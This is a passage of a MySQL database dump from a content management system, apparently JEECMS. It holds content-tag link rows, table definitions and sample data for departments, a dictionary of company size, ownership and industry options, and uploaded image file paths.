INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (117,3,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (117,557,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (117,558,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (117,559,5);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (117,560,6);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (118,561,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (118,562,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (118,563,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (118,564,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (118,565,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (118,566,5);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (118,567,6);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (118,568,7);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (118,569,8);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (118,570,9);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (118,269,10);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (118,571,11);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (119,572,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (119,21,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (119,573,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (119,574,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (119,24,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (119,575,5);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (119,576,6);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (119,577,7);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (119,578,8);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (119,579,9);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (119,580,10);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (120,581,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (120,582,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (120,583,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (120,584,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (120,585,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (120,586,5);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (120,587,6);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (120,588,7);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (120,589,8);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (121,590,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (121,398,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (121,399,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (121,591,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (121,592,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (121,593,5);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (121,594,6);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (121,398,7);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (121,595,8);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (121,596,9);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (121,597,10);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (121,598,11);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (121,399,12);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (121,599,13);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (122,600,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (122,601,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (122,602,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (122,603,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (122,604,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (122,414,5);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (122,414,6);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (122,567,7);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (122,605,8);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (122,606,9);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (122,607,10);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (122,608,11);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (122,609,12);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (123,610,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (123,611,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (123,612,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (123,613,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (123,614,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (123,615,5);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (123,616,6);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (123,617,7);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (123,618,8);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (123,619,9);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (123,620,10);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (123,621,11);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (123,622,12);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (123,623,13);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (124,519,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (124,624,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (124,155,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (124,625,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (124,626,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (124,627,5);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (124,628,6);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (124,629,7);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (124,630,8);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (124,631,9);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (124,632,10);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (125,633,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (125,634,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (125,635,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (125,636,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (125,637,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (125,638,5);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (125,639,6);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (125,640,7);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (125,641,8);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (126,642,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (126,643,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (126,644,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (126,645,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (126,646,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (126,647,5);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (127,648,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (127,649,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (127,650,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (127,651,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (128,652,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (128,653,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (128,345,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (128,654,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (128,655,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (128,656,5);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (128,345,6);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (128,657,7);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (128,658,8);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (129,322,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (129,628,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (129,659,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (129,660,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (129,661,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (129,662,5);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (129,559,6);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (129,663,7);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (129,664,8);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (129,546,9);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (129,665,10);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (129,666,11);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (129,667,12);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (130,668,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (130,637,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (130,669,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (130,670,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (130,671,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (130,672,5);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (130,641,6);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (131,673,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (131,674,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (131,675,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (131,676,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (131,677,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (131,678,5);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (132,679,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (132,680,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (132,681,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (132,682,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (132,683,4);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (132,684,5);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (132,685,6);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (140,298,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (140,437,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (140,438,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (141,711,0);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (141,712,1);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (141,713,2);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (141,714,3);
INSERT INTO `jc_contenttag` (`content_id`,`tag_id`,`priority`) VALUES (141,715,4);

#
# Source for table jc_department
#

CREATE TABLE `jc_department` (
  `depart_id` int(11) NOT NULL AUTO_INCREMENT,
  `depart_name` varchar(255) NOT NULL DEFAULT '' COMMENT '部门名称',
  `site_id` int(11) DEFAULT '0' COMMENT '站点',
  `priority` int(11) NOT NULL DEFAULT '1' COMMENT '排序',
  `weights` int(11) NOT NULL DEFAULT '1' COMMENT '权重(值越大，级别越高)',
  `parent_id` int(11) DEFAULT NULL COMMENT '父级部门ID',
  PRIMARY KEY (`depart_id`),
  KEY `fk_jc_department_site` (`site_id`),
  KEY `fk_jc_jc_department_parent` (`parent_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='部门';

#
# Dumping data for table jc_department
#

INSERT INTO `jc_department` (`depart_id`,`depart_name`,`site_id`,`priority`,`weights`,`parent_id`) VALUES (1,'一级部门',NULL,1,1,NULL);

#
# Source for table jc_dictionary
#

CREATE TABLE `jc_dictionary` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL COMMENT 'name',
  `value` varchar(255) NOT NULL COMMENT 'value',
  `type` varchar(255) NOT NULL COMMENT 'type',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=12 DEFAULT CHARSET=utf8 COMMENT='字典表';

#
# Dumping data for table jc_dictionary
#

INSERT INTO `jc_dictionary` (`id`,`name`,`value`,`type`) VALUES (1,'10-20人','10-20人','scale');
INSERT INTO `jc_dictionary` (`id`,`name`,`value`,`type`) VALUES (2,'20-50人','20-50人','scale');
INSERT INTO `jc_dictionary` (`id`,`name`,`value`,`type`) VALUES (3,'50-10人','50-10人','scale');
INSERT INTO `jc_dictionary` (`id`,`name`,`value`,`type`) VALUES (4,'100人以上','100人以上','scale');
INSERT INTO `jc_dictionary` (`id`,`name`,`value`,`type`) VALUES (5,'私企','私企','nature');
INSERT INTO `jc_dictionary` (`id`,`name`,`value`,`type`) VALUES (6,'股份制','股份制','nature');
INSERT INTO `jc_dictionary` (`id`,`name`,`value`,`type`) VALUES (7,'国企','国企','nature');
INSERT INTO `jc_dictionary` (`id`,`name`,`value`,`type`) VALUES (8,'互联网','互联网','industry');
INSERT INTO `jc_dictionary` (`id`,`name`,`value`,`type`) VALUES (9,'房地产','房地产','industry');
INSERT INTO `jc_dictionary` (`id`,`name`,`value`,`type`) VALUES (10,'加工制造','加工制造','industry');
INSERT INTO `jc_dictionary` (`id`,`name`,`value`,`type`) VALUES (11,'服务行业','服务行业','industry');

#
# Source for table jc_directive_tpl
#

CREATE TABLE `jc_directive_tpl` (
  `tpl_id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL COMMENT '标签名称',
  `description` varchar(1000) DEFAULT NULL COMMENT '标签描述',
  `code` text COMMENT '标签代码',
  `user_id` int(11) NOT NULL COMMENT '标签创建者',
  PRIMARY KEY (`tpl_id`),
  KEY `fk_jc_directive_tpl_user` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='FComment';

#
# Dumping data for table jc_directive_tpl
#


#
# Source for table jc_file
#

CREATE TABLE `jc_file` (
  `file_path` varchar(255) NOT NULL DEFAULT '' COMMENT '文件路径',
  `file_name` varchar(255) DEFAULT '' COMMENT '文件名字',
  `file_isvalid` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否有效',
  `content_id` int(11) DEFAULT NULL COMMENT '内容id',
  PRIMARY KEY (`file_path`),
  KEY `fk_jc_file_content` (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

#
# Dumping data for table jc_file
#

INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/jeecmsv8/u/cms/www/201606/30094553q0uo.jpg','Koala.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/jeecmsv8f/u/cms/www/201610/13165317n9v8.jpg','1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/bj/201505/15163118hoig.jpg','mv1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/09093632txyy.jpg','09093632txyy.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/090938248x1c.jpg','090938248x1c.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/090940173zaj.jpg','090940173zaj.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/09094140f562.jpg','09094140f562.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/09094302sldg.jpg','09094302sldg.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/09094430w0xt.jpg','09094430w0xt.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/09151507n6i1.jpg','09151507n6i1.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/09152518pzoq.jpg','09152518pzoq.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/09152931cgps.jpg','09152931cgps.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/091552426die.jpg','091552426die.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/0915541140xt.jpg','0915541140xt.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/09160120meel.jpg','09160120meel.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/091602465aop.jpg','091602465aop.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/09165026tk5e.jpg','09165026tk5e.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/091655240woj.jpg','091655240woj.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/09165821s06r.jpg','09165821s06r.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/09170006n0hs.jpg','09170006n0hs.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/09174523xkvt.jpg','09174523xkvt.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/09174527lkok.jpg','09174527lkok.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/10092229195q.jpg','10092229195q.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/100950366ij3.jpg','100950366ij3.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/100953460bvo.jpg','100953460bvo.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/10103806oifr.jpg','10103806oifr.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/10104531ukj5.jpg','10104531ukj5.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/10144918u244.jpg','10144918u244.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/11165619lkm8.jpg','11165619lkm8.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/11165624319n.jpg','11165624319n.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/111656292jx9.jpg','111656292jx9.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/11165633po01.jpg','11165633po01.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/111656366w4b.jpg','111656366w4b.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/11165640djk4.jpg','11165640djk4.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/11165849ahx1.jpg','11165849ahx1.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/11170224nw94.jpg','11170224nw94.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/11170651qc2f.jpg','11170651qc2f.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/11170656zz9b.jpg','11170656zz9b.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/111707001w2k.jpg','111707001w2k.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/11170703j2h2.jpg','11170703j2h2.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/111707071tn0.jpg','111707071tn0.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/11170712hp37.jpg','11170712hp37.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/111707541g63.jpg','111707541g63.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/11171054ja61.jpg','11171054ja61.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/11171058td8f.jpg','11171058td8f.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/11171102ae78.jpg','11171102ae78.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/11171106qaui.jpg','11171106qaui.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/11171109m2sr.jpg','11171109m2sr.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/11171211kmih.jpg','11171211kmih.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/11171546aux9.jpg','11171546aux9.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/111715499z6t.jpg','111715499z6t.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/11171553t5kf.jpg','11171553t5kf.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/11171558kiit.jpg','11171558kiit.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/11171603em6o.jpg','11171603em6o.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/11171606wnmy.jpg','11171606wnmy.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/1117164754x7.jpg','1117164754x7.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/11172127ltqx.jpg','11172127ltqx.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/111721308eyj.jpg','111721308eyj.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/11172134wikw.jpg','11172134wikw.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/11172137nwy5.jpg','11172137nwy5.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/11172219hw2t.jpg','11172219hw2t.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/11173208w8ji.jpg','11173208w8ji.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/11173213qlec.jpg','11173213qlec.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/111732181p5u.jpg','111732181p5u.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/11173222qknp.jpg','11173222qknp.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/1117323496nx.jpg','1117323496nx.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/11173244ggfv.jpg','11173244ggfv.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/11173334yvdd.jpg','11173334yvdd.jpg',1,NULL);
